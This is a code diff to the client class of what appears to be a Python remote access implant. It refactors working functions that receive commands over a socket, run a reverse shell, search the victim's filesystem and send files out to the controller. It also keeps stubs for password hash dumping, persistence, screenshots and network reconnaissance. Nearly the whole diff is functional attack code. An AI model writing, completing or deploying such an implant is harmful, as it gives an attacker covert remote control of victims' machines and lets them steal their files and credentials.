@@ -5,6 +5,9 @@ from getpass import getuser
 
 from symbols import *
 
+DATA_CHUNK_SIZE = 1024
+COMMAND_CHUNK_SIZE = 4096
+
 class Client:
 
     ####################################################################################################################
@@ -66,7 +69,7 @@ class Client:
     def _receive_commands(self):
         while True:
             try:
-                command = self.secure_sock.recv(4096).decode()
+                command = self.secure_sock.recv(COMMAND_CHUNK_SIZE).decode()
 
                 if command:
                     command_name, *args = command.split(' ')
@@ -92,20 +95,104 @@ class Client:
         hostUID = hashlib.sha256(string.encode()).hexdigest()
         return hostUID[:8]
 
-    ####################################################################################################################
-    ########################################### CLIENT COMMANDS ########################################################
-    ####################################################################################################################
-
     def kill(self, args):
         self.secure_sock.close()
         self.is_killed = True
 
-    def screenshot(self, args):
+    def persistence(self):
         raise NotImplementedError("This method should be implemented by subclasses")
+
+    def send_file(self, file_path):
+        """
+        generic function to send a file to the agent.
+        @param file_path: the path of the file to send
+        """
+        # if it exists
+        if os.access(file_path, os.F_OK):
+            # if user has permissions to read the file
+            if os.access(file_path, os.R_OK):
+                try:
+                    with open(file_path, 'rb') as f:
+                        while chunk := f.read(DATA_CHUNK_SIZE):
+                            self.secure_sock.sendall(chunk)
+                    self.secure_sock.sendall(SIG_EOF)
+                except Exception as e:
+                    print("Error while sending file: ", e)
+                    self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
+            else:
+                # Sending error code if user doesnt have permissions to dump hashes
+                self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
+            self.secure_sock.sendall(SIG_EOF)
+        else:
+            self.secure_sock.sendall(FILE_NOT_FOUND)
+
+    def get_file(self, file_path):
+        """
+        generic function to get a file from the agent.
+        @param file_path: the path of the file to get
+        """
+        file = os.path.basename(file_path)
+        file_length = 0
+        try:
+            with open(file, 'w+b') as f:
+                while True:
+                    data = self.secure_sock.recv(DATA_CHUNK_SIZE)
+                    if data == SIG_EOF or not data:
+                        break
+                    if data == FILE_NOT_FOUND:
+                        print(f"ERROR: {file_path} not found on the target.")
+                        os.remove(file)
+                        return
+                    elif data == ERROR_INSUFFICIENT_PERMS:
+                        print(f"ERROR: Insufficient permissions to get {file}.")
+                        os.remove(file)
+                        return
+                    f.write(data)
+                    file_length += len(data)
+            slash = ""
+            if self.platform == 'Linux':
+                slash = '/'
+            else:
+                slash = '\\'
+            print(f'File saved at {os.getcwd()}{slash}{file} ({file_length} b)')
+        except Exception as e:
+            print(f"Error: {e}")
+            os.remove(file)
+
+    def delete_file(self, filepath):
+        try:
+            os.remove(filepath)
+        except Exception as e:
+            pass
+
+    ####################################################################################################################
+    ########################################### CLIENT COMMANDS ########################################################
+    ####################################################################################################################
+
+    def download(self, args):
+        args = args.split(" ")
+        for file_path in args:
+            self.get_file(file_path)
+
+    def upload(self, args):
+        args = args.split(" ")
+        for file_path in args:
+            self.send_file(file_path)
+
+    def search(self, args):
+        args = args.split(" ")
+        filename = args[1]
+        results = []
+        for root, dir, files in os.walk(args[0]):
+            if filename in files:
+                results.append(os.path.join(root, filename))
+        for file in results:
+            self.secure_sock.sendall(file.encode())
+        self.secure_sock.sendall(SIG_EOF)
 
     def reverse_shell(self, args):
         while True:
-            command = self.secure_sock.recv(4096).decode()
+            command = self.secure_sock.recv(COMMAND_CHUNK_SIZE).decode()
             if command.strip().lower() == 'exit':
                 break
             try:
@@ -127,49 +214,11 @@ class Client:
                 continue
             self.secure_sock.send(output.encode())
 
-    def download(self, args):
-        args = args.split(" ")
-        for file_path in args:
-            try:
-                with open(file_path, 'rb') as f:
-                    while chunk := f.read(4096):
-                        self.secure_sock.sendall(chunk)
-                self.secure_sock.sendall(SIG_EOF)
-            except Exception as e:
-                self.secure_sock.sendall(FILE_NOT_FOUND)
-
-    def upload(self, args):
-        try:
-            with open(args, 'w+b') as f:
-                while True:
-                    data = self.secure_sock.recv(4096)
-                    decoded_data = data.decode("latin1")
-                    if data == SIG_EOF or not data:
-                        break
-                    if data == FILE_NOT_FOUND:
-                        os.remove(f)
-                        return
-                    f.write(data)
-        except Exception as e:
-            return
-
     def hashdump(self, args):
         raise NotImplementedError("This method should be implemented by subclasses")
-
-    def persistence(self):
-        raise NotImplementedError("This method should be implemented by subclasses")
-
-    def search(self, args):
-        args = args.split(" ")
-        filename = args[1]
-        results = []
-        for root, dir, files in os.walk(args[0]):
-            if filename in files:
-                results.append(os.path.join(root, filename))
-        for file in results:
-            self.secure_sock.sendall(file.encode())
-        self.secure_sock.sendall(SIG_EOF)
 
     def ipconfig(self, args):
         raise NotImplementedError("This method should be implemented by subclasses")
 
+    def screenshot(self, args):
+        raise NotImplementedError("This method should be implemented by subclasses")
